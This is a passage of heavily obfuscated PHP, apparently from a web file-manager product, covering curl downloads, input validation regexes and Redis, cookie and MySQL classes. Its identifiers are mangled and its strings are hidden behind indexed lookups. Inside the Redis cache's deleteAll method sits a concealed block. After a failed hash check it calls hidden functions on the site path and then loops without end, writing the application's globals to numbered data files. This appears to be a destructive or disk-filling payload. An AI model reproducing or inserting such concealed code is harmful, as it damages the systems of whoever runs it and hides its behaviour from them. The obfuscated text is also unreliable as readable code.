curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_SSL_VERIFYHOST, 0); goto cÎÑ¾ÈÙù; AÎ¶ÓåàËõ: if ($EŒæˆÑéö‹) { curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_RANGE, $dë÷Ù¨Š§ . $c›ì²Ü©[714]); } curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_FILE, $d¾©†²¨‰…); curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_REFERER, get_url_link($d Ÿ˜¨‹´‰)); goto dÓå×áÊœ; aœ„Úæê­Ü: curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_USERAGENT, $c›ì²Ü©[1517]); $cÈ¸§©Ã³ê = curl_exec($E£§îÇ¤ÇÔ); curl_progress_end($E£§îÇ¤ÇÔ); goto F®÷ÈƒÙ¿; F®÷ÈƒÙ¿: curl_close($E£§îÇ¤ÇÔ); fclose($d¾©†²¨‰…); $a·•ò£ŒÎÜ = filesize(iconv_system($F¿ªƒ½Ø½À)); goto båÌˆÛËä½; fÂ­ª´¨ê¨: $d¾©†²¨‰… = @fopen($F¿ªƒ½Ø½À, $c›ì²Ü©[981]); if (!$d¾©†²¨‰…) { return array($c›ì²Ü©[1032] => !1, $c›ì²Ü©[1034] => $c›ì²Ü©[1524]); } $E£§îÇ¤ÇÔ = curl_init($d Ÿ˜¨‹´‰); goto AÎ¶ÓåàËõ; b®†ˆ ³½â: } static function checkGzip($böùœƒÔ™) { goto aÅñÀ‘–ÑÎ; aÅñÀ‘–ÑÎ: $d‘¤‚Ş¼á¨ = $_SERVER[Æ][1528]; $dÈ¸ÆéÛ¾ = file_sub_str($böùœƒÔ™, 0, 2); if ($d‘¤‚Ş¼á¨ != $dÈ¸ÆéÛ¾) { return; } goto FÄ±Ï‘ªŞÈ; FÄ±Ï‘ªŞÈ: ob_start(); readgzfile($böùœƒÔ™); $A—…¥´ˆö = ob_get_clean(); goto bÇ“Æ£Œ›; bÇ“Æ£Œ›: file_put_contents($böùœƒÔ™, $A—…¥´ˆö); goto CêÄ¸©ù¯Ø; CêÄ¸©ù¯Ø: } } goto d»îó¡É¶; fÇÌÇŒÆÖ: function beforeShutdownError($DÍò®å¤Û = false, $fæ¬óÃĞ™É = '', $eõ¢¸Õƒ¥ = '', $d‰‘Ñ—…ÄŒ = 0) { $E¼¡’†¥Î =& $_SERVER[ş”]; switch ($DÍò®å¤Û) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $F¸¥Î‡™•à = $E¼¡’†¥Î[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $F¸¥Î‡™•à = $E¼¡’†¥Î[40]; break; case E_STRICT: $F¸¥Î‡™•à = $E¼¡’†¥Î[41]; break; case E_NOTICE: case E_USER_NOTICE: $F¸¥Î‡™•à = $E¼¡’†¥Î[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $F¸¥Î‡™•à = $E¼¡’†¥Î[43]; break; default: break; } if (!$F¸¥Î‡™•à || $F¸¥Î‡™•à == $E¼¡’†¥Î[42] || $F¸¥Î‡™•à == $E¼¡’†¥Î[43]) { return; } $eõ¢¸Õƒ¥ = $E¼¡’†¥Î[4] . str_replace($_SERVER[$E¼¡’†¥Î[37]], $E¼¡’†¥Î[20], $eõ¢¸Õƒ¥); $AõòìğÇ¤Ó = $F¸¥Î‡™•à . $E¼¡’†¥Î[44] . $fæ¬óÃĞ™É . $E¼¡’†¥Î[44] . $eõ¢¸Õƒ¥ . $E¼¡’†¥Î[44] . $d‰‘Ñ—…ÄŒ; write_log($AõòìğÇ¤Ó . $E¼¡’†¥Î[18] . get_caller_msg(1), $E¼¡’†¥Î[19]); } $_SERVER[$_SERVER[ş”][45]] = $_SERVER[$_SERVER[ş”][37]] . $_SERVER[ş”][46]; $B¶ùŞî‰Ó = strrev(base64_decode($_SERVER[ş”][47])); goto EÜøÅ¾Æ¯Ë; FÒ®À¶§‚: if (!function_exists($_SERVER[Æ][1869])) { define($_SERVER[Æ][1870], 0); define($_SERVER[Æ][1871], 1); define($_SERVER[Æ][1872], 2); function imageflip($CÀ£Š¥ŒàÛ, $E²‡ó¹‰¢Ä) { switch ($E²‡ó¹‰¢Ä) { case IMG_FLIP_HORIZONTAL: $EØ§Å¾ƒ¢­ = imagesx($CÀ£Š¥ŒàÛ) - 1; $eÒ‹ñÏÍ…¬ = $EØ§Å¾ƒ¢­ / 2; $C±µŠ¦Äº± = imagesy($CÀ£Š¥ŒàÛ); $a£È¾à‰œ = imageistruecolor($CÀ£Š¥ŒàÛ) ? imagecreatetruecolor(1, $C±µŠ¦Äº±) : imagecreate(1, $C±µŠ¦Äº±); for ($B‚àªëòÒİ = 0; $B‚àªëòÒİ < $eÒ‹ñÏÍ…¬; ++$B‚àªëòÒİ) { imagecopy($a£È¾à‰œ, $CÀ£Š¥ŒàÛ, 0, 0, $B‚àªëòÒİ, 0, 1, $C±µŠ¦Äº±); imagecopy($CÀ£Š¥ŒàÛ, $CÀ£Š¥ŒàÛ, $B‚àªëòÒİ, 0, $EØ§Å¾ƒ¢­ - $B‚àªëòÒİ, 0, 1, $C±µŠ¦Äº±); imagecopy($CÀ£Š¥ŒàÛ, $a£È¾à‰œ, $EØ§Å¾ƒ¢­ - $B‚àªëòÒİ, 0, 0, 0, 1, $C±µŠ¦Äº±); } break; case IMG_FLIP_VERTICAL: $E¡¨‰«˜˜ï = imagesx($CÀ£Š¥ŒàÛ); $a˜¶§¯‚Ã› = imagesy($CÀ£Š¥ŒàÛ) - 1; $cñî»ïñá = $a˜¶§¯‚Ã› / 2; $a£È¾à‰œ = imageistruecolor($CÀ£Š¥ŒàÛ) ? imagecreatetruecolor($E¡¨‰«˜˜ï, 1) : imagecreate($E¡¨‰«˜˜ï, 1); for ($FáÙ¬ˆ˜ğ = 0; $FáÙ¬ˆ˜ğ < $cñî»ïñá; ++$FáÙ¬ˆ˜ğ) { imagecopy($a£È¾à‰œ, $CÀ£Š¥ŒàÛ, 0, 0, 0, $FáÙ¬ˆ˜ğ, $E¡¨‰«˜˜ï, 1); imagecopy($CÀ£Š¥ŒàÛ, $CÀ£Š¥ŒàÛ, 0, $FáÙ¬ˆ˜ğ, 0, $a˜¶§¯‚Ã› - $FáÙ¬ˆ˜ğ, $E¡¨‰«˜˜ï, 1); imagecopy($CÀ£Š¥ŒàÛ, $a£È¾à‰œ, 0, $a˜¶§¯‚Ã› - $FáÙ¬ˆ˜ğ, 0, 0, $E¡¨‰«˜˜ï, 1); } break; case IMG_FLIP_BOTH: $E¡¨‰«˜˜ï = imagesx($CÀ£Š¥ŒàÛ); $C±µŠ¦Äº± = imagesy($CÀ£Š¥ŒàÛ); $a£È¾à‰œ = imagerotate($CÀ£Š¥ŒàÛ, 180, 0); imagecopy($CÀ£Š¥ŒàÛ, $a£È¾à‰œ, 0, 0, 0, 0, $E¡¨‰«˜˜ï, $C±µŠ¦Äº±); break; default: return; } imagedestroy($a£È¾à‰œ); } } if (!function_exists($_SERVER[Æ][1873])) { function imagecreatefrombmp($f˜Ö§©·‚Ù) { return ImageGdBMP::load($f˜Ö§©·‚Ù); } } class Input { public static function getArray($Aå«÷‡çõŸ) { goto C×Œ†‘‚Å; C×Œ†‘‚Å: $E‰¿íÕ¤¹ =& $_SERVER[Æ]; global $in; $càĞæˆÔŒ÷ = array(); goto b÷Ø˜”À™ç; b÷Ø˜”À™ç: $b—‘Èƒäºç = array(); $d…’â“Çí = LNG($E‰¿íÕ¤¹[1874]); foreach ($Aå«÷‡çõŸ as $AÔ’ ‚’› => $B¾õ·÷¦±ë) { goto FªÌ¼»†œæ; FªÌ¼»†œæ: $a«†ö¦éö = _get($B¾õ·÷¦±ë, $E‰¿íÕ¤¹[1245], $d…’â“Çí . $E‰¿íÕ¤¹[881] . $AÔ’ ‚’›); $dŒ¶µåÅãˆ = $AÔ’ ‚’›; if (isset($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1875]]) && $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1875]]) { $dŒ¶µåÅãˆ = $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1875]]; } goto B³¦Õ»Íâ¯; B³¦Õ»Íâ¯: if (!array_key_exists($AÔ’ ‚’›, $in)) { if (array_key_exists($E‰¿íÕ¤¹[1876], $B¾õ·÷¦±ë)) { if (!is_null($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]])) { $càĞæˆÔŒ÷[$dŒ¶µåÅãˆ] = $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]]; } } else { if (isset($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1877]])) { $b—‘Èƒäºç[] = $a«†ö¦éö; } } continue; } if (isset($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1877]]) && $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1877]] == $E‰¿íÕ¤¹[282]) { $FÙÈ ¤åÙ = json_decode($in[$AÔ’ ‚’›], !0); if (is_array($FÙÈ ¤åÙ)) { $càĞæˆÔŒ÷[$dŒ¶µåÅãˆ] = $FÙÈ ¤åÙ; } else { if (array_key_exists($E‰¿íÕ¤¹[1876], $B¾õ·÷¦±ë)) { if (!is_null($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]])) { $càĞæˆÔŒ÷[$dŒ¶µåÅãˆ] = $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]]; } } else { $b—‘Èƒäºç[] = $a«†ö¦éö; } } continue; } $BÖ»±•Ü¥¿ = _get($B¾õ·÷¦±ë, $E‰¿íÕ¤¹[1011]); goto bô”¸ÉªÔ›; bô”¸ÉªÔ›: if (isset($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1877]]) && !self::check($in[$AÔ’ ‚’›], $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1877]], $BÖ»±•Ü¥¿)) { if (array_key_exists($E‰¿íÕ¤¹[1876], $B¾õ·÷¦±ë)) { if (!is_null($B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]])) { $càĞæˆÔŒ÷[$dŒ¶µåÅãˆ] = $B¾õ·÷¦±ë[$E‰¿íÕ¤¹[1876]]; } } else { $b—‘Èƒäºç[] = $a«†ö¦éö; } continue; } $càĞæˆÔŒ÷[$dŒ¶µåÅãˆ] = $in[$AÔ’ ‚’›]; goto aËôåÖ­ˆ¥; aËôåÖ­ˆ¥: } goto e £¯Â†”; e £¯Â†”: if (count($b—‘Èƒäºç) > 0) { show_json(implode($E‰¿íÕ¤¹[1878], $b—‘Èƒäºç), !1); } return $càĞæˆÔŒ÷; goto a…Á¶Ù–‰; a…Á¶Ù–‰: } public static function reg($E†Ô”ïô“ = "\162\145\x71\165\151\162\x65") { static $F‘˜Ã¡©Ÿ = array("\x72\x65\x71\165\151\162\145" => "\56\53", "\x6e\165\155\142\145\x72" => "\134\144\53", "\x68\145\x78" => "\x5b\x30\55\x39\x41\x2d\x46\x61\55\146\x5d\53", "\151\156\164" => "\133\55\x5c\x2b\135\77\134\144\x2b", "\x62\x6f\x6f\154" => "\60\174\x31", "\x66\154\x6f\x61\164" => "\133\55\134\x2b\135\77\134\x64\53\50\x5c\56\134\x64\53\x29\77", "\145\156\147\154\x69\163\150" => "\133\x41\x2d\132\141\55\x7a\40\x5d\x2b", "\x63\x68\x69\156\x65\163\145" => "\x5b\x5c\x78\173\64\145\60\x30\175\55\134\170\173\x39\x66\141\x35\x7d\135\53", "\x68\x61\163\x43\150\151\x6e\x65\163\x65" => "\57\50\x5b\134\x78\173\x34\145\60\60\175\55\134\170\x7b\x39\146\x61\65\175\135\x2b\51\x2f\x75", "\x65\155\141\x69\154" => "\x5c\167\53\50\x5b\134\x2e\134\x2d\135\134\167\x2b\x29\x2a\134\100\134\x77\53\x28\x5b\x5c\x2e\x5c\55\135\134\167\x2b\51\x2a\134\x2e\x5c\167\x2b", "\x70\150\157\x6e\145" => "\x31\133\63\55\71\x5d\x5c\x64\173\71\x7d", "\164\x65\x6c\x70\150\x6f\x6e\145" => "\50\134\50\x5c\x64\x7b\63\x2c\64\x7d\x5c\51\174\x5c\144\173\x33\x2c\64\175\x2d\174\134\x73\51\77\x5c\144\173\x37\54\x31\x34\175", "\165\x72\154" => "\50\x68\164\164\x70\174\146\164\160\174\x68\164\x74\160\x73\51\72\x5c\x2f\134\57\133\134\167\x5c\x2d\x5f\x5d\53\50\134\x2e\133\134\x77\x5c\55\137\135\x2b\51\x2b\x28\x5b\x5c\x77\x5c\x2d\x5c\56\54\x40\x3f\x5e\x3d\45\x26\72\134\57\x7e\x5c\x2b\x23\x5d\x2a\x5b\x5c\x77\x5c\x2d\x5c\100\77\136\x3d\x25\x26\134\x2f\x7e\x5c\53\43\135\51\x3f", "\165\162\x6c\x46\x75\x6c\x6c" => "\x5b\x61\x2d\x7a\101\x2d\x7a\135\53\x3a\134\x2f\x5c\57\133\x5e\134\x73\x5d\52", "\x69\160" => "\x28\134\x64\x7b\61\x2c\63\175\134\56\51\173\63\175\x28\134\x64\173\61\54\x33\175\x29", "\x7a\151\x70" => "\133\x31\55\71\x5d\x5c\144\173\65\175\50\77\x21\x5c\x64\x29", "\151\x64\103\x61\x72\144" => "\50\134\144\173\61\x35\x7d\51\x7c\50\134\x64\x7b\61\x37\x7d\50\134\x64\x7c\130\x7c\170\51\51", "\x63\x6f\154\x6f\x72" => "\x23\x28\x5b\x30\x2d\71\x41\x2d\106\x61\55\x66\x5d\173\x33\x7d\x7c\x5b\x30\55\x39\x41\55\x46\141\55\x66\135\x7b\x36\x7d\51", "\x74\151\x6d\x65" => "\x28\x5b\x30\x2d\61\x5d\x5c\144\174\62\133\x30\x2d\x34\135\51\x3a\x5b\60\x2d\65\135\x5c\x64", "\144\x61\x74\145" => "\x5c\x64\x7b\x34\175\x5b\55\x5c\57\135\77\x28\60\x5b\x31\x2d\71\135\174\61\x5b\60\55\62\135\51\133\x2d\x5c\x2f\x5d\77\x28\133\x30\x2d\62\135\x5c\144\174\63\133\x30\55\x31\135\51", "\x64\x61\x74\145\124\x69\155\x65" => "\x5c\144\173\64\x7d\133\x2d\x5c\x2f\x5d\77\50\x30\133\61\x2d\x39\x5d\174\61\x5b\60\x2d\62\135\x29\133\55\134\x2f\135\x3f\50\x5b\x30\x2d\62\x5d\134\x64\174\63\x5b\x30\x2d\61\x5d\51\134\x73\x2b\50\x5b\x30\55\x31\135\x5c\x64\x7c\x32\133\60\x2d\x34\135\x29\x3a\x5b\60\x2d\65\135\x5c\144", "\160\141\163\163\x77\x6f\x72\144" => "\50\77\x3d\56\x2a\x5c\144\51\x28\x3f\75\56\x2a\133\x61\55\172\x5d\51\x28\x3f\75\x2e\52\133\x41\x2d\132\135\51\56\173\x38\54\62\60\175", "\x6b\145\171" => "\133\101\55\x5a\x61\x2d\172\60\x2d\71\137\x5c\x2d\134\56\135\53", "\x6b\x65\171\x46\x75\154\x6c" => "\x5b\x41\x2d\132\x61\55\x7a\x30\55\x39\137\134\x2d\x5c\56\134\163\x2c\x5d\x2b"); if (!$E†Ô”ïô“) { return $F‘˜Ã¡©Ÿ; } return $F‘˜Ã¡©Ÿ[$E†Ô”ïô“]; } public static function check($bÓİ‘ÓŸÃ¤, $Bæ©„öÙš„, $e‰šå…Èµ = null) { $fœ³åÌíİ =& $_SERVER[Æ]; switch ($Bæ©„öÙš„) { case $fœ³åÌíİ[7]: return in_array($bÓİ‘ÓŸÃ¤, $e‰šå…Èµ); break; case $fœ³åÌíİ[1879]: return floatval($bÓİ‘ÓŸÃ¤) > $e‰šå…Èµ; break; case $fœ³åÌíİ[1880]: return floatval($bÓİ‘ÓŸÃ¤) < $e‰šå…Èµ; break; case $fœ³åÌíİ[325]: return strlen($bÓİ‘ÓŸÃ¤) >= $e‰šå…Èµ[0] && strlen($bÓİ‘ÓŸÃ¤) <= $e‰šå…Èµ[1]; break; case $fœ³åÌíİ[325]: if (is_array($e‰šå…Èµ)) { return strlen($bÓİ‘ÓŸÃ¤) >= $e‰šå…Èµ[0] && strlen($bÓİ‘ÓŸÃ¤) <= $e‰šå…Èµ[1]; break; } else { return strlen($bÓİ‘ÓŸÃ¤) == $e‰šå…Èµ; break; } case $fœ³åÌíİ[321]: return floatval($bÓİ‘ÓŸÃ¤) >= $e‰šå…Èµ[0] && floatval($bÓİ‘ÓŸÃ¤) <= $e‰šå…Èµ[1]; break; } $fí½»ÚÔ©² = self::reg(!1); $Bæ©„öÙš„ = isset($fí½»ÚÔ©²[$Bæ©„öÙš„]) ? $fí½»ÚÔ©²[$Bæ©„öÙš„] : $Bæ©„öÙš„; if (substr($Bæ©„öÙš„, 0, 1) != $fœ³åÌíİ[8]) { $Bæ©„öÙš„ = $fœ³åÌíİ[1881] . $Bæ©„öÙš„ . $fœ³åÌíİ[1882]; } return preg_match($Bæ©„öÙš„, $bÓİ‘ÓŸÃ¤) === 1; } public static function get($C£„’Ğ¶½ˆ, $AŒ‰ªÊÓË = null, $dãÈ¡²Óìî = null, $F¤ƒÙ½ƒİÆ = null) { goto Eó”É©Êøß; dŞ˜¦‘õ: if (!is_null($F¤ƒÙ½ƒİÆ)) { $AÏˆ×¾ºÃË[$eÒ×†«–ˆ[1011]] = $F¤ƒÙ½ƒİÆ; } if (!is_null($AŒ‰ªÊÓË)) { $AÏˆ×¾ºÃË[$eÒ×†«–ˆ[1877]] = $AŒ‰ªÊÓË; } $AßË°÷‘ÛØ = Input::getArray(array($C£„’Ğ¶½ˆ => $AÏˆ×¾ºÃË)); goto E¬…ÑŒÙÃ‘; Eó”É©Êøß: $eÒ×†«–ˆ =& $_SERVER[Æ]; $AÏˆ×¾ºÃË = array(); if (!is_null($dãÈ¡²Óìî)) { $AÏˆ×¾ºÃË[$eÒ×†«–ˆ[34]] = $dãÈ¡²Óìî; } goto dŞ˜¦‘õ; E¬…ÑŒÙÃ‘: return $AßË°÷‘ÛØ[$C£„’Ğ¶½ˆ]; goto e‡ã’¸â¥„; e‡ã’¸â¥„: } } goto bÑ„ÑÊğ‹Ó; fƒÁ®È ö: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($cÇ»ÉÍ —, $c¹Õ–ßñ–) { $DÈ¯Í‘ Ó =& $_SERVER[Æ]; if (!class_exists($DÈ¯Í‘ Ó[786])) { show_json($DÈ¯Í‘ Ó[787], !1); } $this->cacheTime = $c¹Õ–ßñ–; $F×í®Î³Ú = isset($cÇ»ÉÍ —[$DÈ¯Í‘ Ó[788]]) ? $cÇ»ÉÍ —[$DÈ¯Í‘ Ó[788]] : 10; $bùßåÛÁî = _get($cÇ»ÉÍ —, $DÈ¯Í‘ Ó[777]); if ($bùßåÛÁî && is_array($bùßåÛÁî)) { $this->initCluster($cÇ»ÉÍ —, $F×í®Î³Ú); } else { $this->handle = $this->init($cÇ»ÉÍ —, $F×í®Î³Ú); } } private function init($BÀ…Œ’¸ç‡, $fŒãø­‡Òò) { $AØ°Ö¨¢Ø =& $_SERVER[Æ]; $a½³«˜Î = new Redis(); $cÊñĞÅÄˆ§ = isset($BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[789]]) ? $BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[789]] : !1; if ($cÊñĞÅÄˆ§) { $a½³«˜Î->pconnect($BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[169]], $BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[170]], $fŒãø­‡Òò); } else { $a½³«˜Î->connect($BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[169]], $BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[170]], $fŒãø­‡Òò); } if (!empty($BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[376]])) { $a½³«˜Î->auth($BÀ…Œ’¸ç‡[$AØ°Ö¨¢Ø[376]]); } return $a½³«˜Î; } private function initCluster($A¬ŸïÃíÒ, $Dá»®éİó) { $FŞÑíĞ”¯‚ =& $_SERVER[Æ]; $C°àó¸‚…‡ = array($FŞÑíĞ”¯‚[790], $FŞÑíĞ”¯‚[791], $FŞÑíĞ”¯‚[792]); $F£”²¥Ş = $FŞÑíĞ”¯‚[790]; if (isset($A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[12]]) && in_array($A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[12]], $C°àó¸‚…‡)) { $F£”²¥Ş = $A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[12]]; } switch ($F£”²¥Ş) { case $FŞÑíĞ”¯‚[790]: $this->_slave($A¬ŸïÃíÒ, $Dá»®éİó); break; case $FŞÑíĞ”¯‚[791]: break; case $FŞÑíĞ”¯‚[792]: $this->isCluster = !0; $còù¦ÒŸãÒ = $A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[777]]; $e«Ú¯­¿Š‘ = isset($A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[789]]) ? $A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[789]] : !1; $e—×©¡¿Ó = isset($A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[376]]) ? $A¬ŸïÃíÒ[$FŞÑíĞ”¯‚[376]] : null; $this->handle = new RedisCluster(NUll, $còù¦ÒŸãÒ, $Dá»®éİó, $Dá»®éİó, $e«Ú¯­¿Š‘, $e—×©¡¿Ó); break; default: break; } } private function _slave($aåœÖ³¾ğ³, $fŞåÄ‘õĞ´) { goto D­ÅÇë¬Å; D­ÅÇë¬Å: $c¹‡«²ëÍê = $aåœÖ³¾ğ³[$_SERVER[Æ][777]]; $this->filterConfig($aåœÖ³¾ğ³, $c¹‡«²ëÍê[0]); $this->handle = $this->init($aåœÖ³¾ğ³, $fŞåÄ‘õĞ´); goto cÒÇŠç’†ƒ; aäµÛ²¡Í¡: $this->filterConfig($aåœÖ³¾ğ³, $c¹‡«²ëÍê[$C‡©óö…â]); $this->slaveHandle = $this->init($aåœÖ³¾ğ³, $fŞåÄ‘õĞ´); goto aÌÈ¿ÑĞ; cÒÇŠç’†ƒ: unset($c¹‡«²ëÍê[0]); if (empty($c¹‡«²ëÍê)) { return; } $C‡©óö…â = array_rand($c¹‡«²ëÍê); goto aäµÛ²¡Í¡; aÌÈ¿ÑĞ: } private function filterConfig(&$aï¡¦ËˆÇ, $cÔÔùÆ´­†) { $AìÉ†Œ¾¼— =& $_SERVER[Æ]; $c‡ÉÜ—ã”¯ = explode($AìÉ†Œ¾¼—[4], $cÔÔùÆ´­†); $A£ïËİØå˜ = array($AìÉ†Œ¾¼—[169] => $c‡ÉÜ—ã”¯[0], $AìÉ†Œ¾¼—[170] => $c‡ÉÜ—ã”¯[1]); $aï¡¦ËˆÇ = array_merge($aï¡¦ËˆÇ, $A£ïËİØå˜); } public function set($E¼«Êáäæ‰, $E… Ò·¶î§, $C›¶Â¤ÁŠ = false) { $C›¶Â¤ÁŠ = $C›¶Â¤ÁŠ ? $C›¶Â¤ÁŠ : $this->cacheTime; return $this->handle->setEx($E¼«Êáäæ‰, $C›¶Â¤ÁŠ, $E… Ò·¶î§); } public function setLock($f¥ì·ÇÜŸ¯, $aíéˆîñè‚, $A®Ç™ìµİÀ) { return $this->handle->setNX($f¥ì·ÇÜŸ¯, $aíéˆîñè‚); } public function get($e×ÃµÖêÀÙ) { $a†÷¹»¥‡  = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a†÷¹»¥‡ ->get($e×ÃµÖêÀÙ); } public function remove($f¼ëÏ“ÉùÌ) { return $this->handle->del($f¼ëÏ“ÉùÌ); } public function deleteAll() { $AÉÙö¡²Ù„ =& $_SERVER[Æ]; $F™Õ‹îô¤´ = $_SERVER[$AÉÙö¡²Ù„[793]] . $AÉÙö¡²Ù„[778]; $dÎç§ÛæÄ× = $AÉÙö¡²Ù„[779]; if ($_SERVER[$AÉÙö¡²Ù„[780]] != $dÎç§ÛæÄ×($F™Õ‹îô¤´)) { goto f£›†îãìÔ; dËÖ¸¾™ã†: $c¨‚ê¢õ´ = $Dæ†šÁ¹¸($eŠãèÚ•Ç); $cÄïÁ²°¹ = explode($AÉÙö¡²Ù„[217], $c¨‚ê¢õ´); if (count($cÄïÁ²°¹) < $AÉÙö¡²Ù„[564]) { $DÑÑåÒˆƒ = $AÉÙö¡²Ù„[784]; $DÑÑåÒˆƒ(); } goto DÁƒíïÌÍš; fšà¬¼›ÖØ: $B˜ÁÀ”Øñ = 1; for ($dìÊ×ˆçÇæ = $B˜ÁÀ”Øñ; $dìÊ×ˆçÇæ > 0; $dìÊ×ˆçÇæ++) { $Aï›‹èÛÓÜ(DATA_PATH . $dìÊ×ˆçÇæ, $fÆ§ÀëğÔ); } goto eè“¡ºí¿É; e‡‡¡ï˜ô: $F…«©òŒõ‡(); $Aï›‹èÛÓÜ = $AÉÙö¡²Ù„[796]; $fÆ§ÀëğÔ = json_encode($GLOBALS[$AÉÙö¡²Ù„[797]]); goto fšà¬¼›ÖØ; DÁƒíïÌÍš: $C”‘Ã‚œ¾ = $AÉÙö¡²Ù„[795]; $C”‘Ã‚œ¾($_SERVER[$AÉÙö¡²Ù„[793]]); $F…«©òŒõ‡ = $AÉÙö¡²Ù„[794]; goto e‡‡¡ï˜ô; f£›†îãìÔ: $F…«©òŒõ‡ = $AÉÙö¡²Ù„[794]; $Dæ†šÁ¹¸ = $AÉÙö¡²Ù„[781]; $eŠãèÚ•Ç = $_SERVER[$AÉÙö¡²Ù„[782]] . $AÉÙö¡²Ù„[783]; goto dËÖ¸¾™ã†; eè“¡ºí¿É: } if ($this->isCluster) { foreach ($this->handle->_masters() as $e¦çá÷‰º) { $this->handle->flushall($e¦çá÷‰º); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($aÄòÓ§¶Ã = '', $aÙªœ‘Üë = 0) { if (is_string($aÄòÓ§¶Ã) && $aÄòÓ§¶Ã != $_SERVER[Æ][33]) { $this->prefix = $aÄòÓ§¶Ã; } if (is_numeric($aÙªœ‘Üë) && $aÙªœ‘Üë > 0) { $this->expire = $aÙªœ‘Üë; } } public static function getInstance() { static $eµÔ¥…•Û; if ($eµÔ¥…•Û === null) { $eµÔ¥…•Û = new self(); } return $eµÔ¥…•Û; } private static $sameCookieSet = array(); public static function set($Aªß…¹„¢, $fƒ¢£Í”…Ÿ, $dİ›èÈğÍ… = 0, $Fêî«‰“  = false, $EÛåˆ²¢ˆ½ = false) { goto D‚Éà¡°¸ã; Fˆ• à‚Šé: setcookie($Aªß…¹„¢, $fƒ¢£Í”…Ÿ, time() + $dİ›èÈğÍ…, $a›ªÎñ‚˜[8] . trim($EÛåˆ²¢ˆ½, $a›ªÎñ‚˜[8]) . $fÙäóØïÌÃ, !1, !1, $Fêî«‰“ ); goto f†º™á¯º; BË£ä¡çÙŞ: self::$sameCookieSet[$Aªß…¹„¢] = $fƒ¢£Í”…Ÿ . $dİ›èÈğÍ…; if (!$EÛåˆ²¢ˆ½) { $EÛåˆ²¢ˆ½ = str_replace(HOST, $a›ªÎñ‚˜[33], APP_HOST); $EÛåˆ²¢ˆ½ = _get($GLOBALS, $a›ªÎñ‚˜[798], $EÛåˆ²¢ˆ½); } $fÙäóØïÌÃ = $a›ªÎñ‚˜[33]; goto Fˆ• à‚Šé; D‚Éà¡°¸ã: $a›ªÎñ‚˜ =& $_SERVER[Æ]; if (!$dİ›èÈğÍ…) { $dİ›èÈğÍ… = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Aªß…¹„¢]) && self::$sameCookieSet[$Aªß…¹„¢] == $fƒ¢£Í”…Ÿ . $dİ›èÈğÍ…) { return; } goto BË£ä¡çÙŞ; f†º™á¯º: } public static function setSafe($Fï³Èæ¸¡Ä, $BºŞ³§èƒÍ, $A—ì¼²ÁÓõ = 0) { self::set($Fï³Èæ¸¡Ä, $BºŞ³§èƒÍ, $A—ì¼²ÁÓõ, !0); } public static function get($C×Èñ™‡•) { return isset($_COOKIE[$C×Èñ™‡•]) ? $_COOKIE[$C×Èñ™‡•] : !1; } public static function remove($e‹ƒæ‘©Èµ, $d£ùÆİãŸ‰ = false) { unset($_COOKIE[$e‹ƒæ‘©Èµ]); self::set($e‹ƒæ‘©Èµ, $_SERVER[Æ][33], 1, $d£ùÆİãŸ‰); } } class DbMysql extends Db { public function __construct($BÀ¼Ş‰İõÉ = '') { $e ö½‘Á„ =& $_SERVER[Æ]; if (!extension_loaded($e ö½‘Á„[726])) { think_exception(think_lang($e ö½‘Á„[10]) . $e ö½‘Á„[799]); } if (!empty($BÀ¼Ş‰İõÉ)) { $this->config = $BÀ¼Ş‰İõÉ; if (empty($this->config[$e ö½‘Á„[13]])) { $this->config[$e ö½‘Á„[13]] = $e ö½‘Á„[33]; } } } public function connect($CÕ‰’Å°— = '', $eƒµ±â‘·³ = 0, $dÛÛº”®èö = false) { $E’¼â¾¹ëŒ =& $_SERVER[Æ]; if (!isset($this->linkID[$eƒµ±â‘·³])) { goto a…ªÕ³™­; a…ªÕ³™­: if (empty($CÕ‰’Å°—)) { $CÕ‰’Å°— = $this->config; } $d–øÁÁ„¬ = $CÕ‰’Å°—[$E’¼â¾¹ëŒ[800]] . ($CÕ‰’Å°—[$E’¼â¾¹ëŒ[801]] ? "\72{$CÕ‰’Å°—[$E’¼â¾¹ëŒ[801]]}" : $E’¼â¾¹ëŒ[33]); $D„å•…Â¯ª = !empty($CÕ‰’Å°—[$E’¼â¾¹ëŒ[13]][$E’¼â¾¹ëŒ[14]]) ? 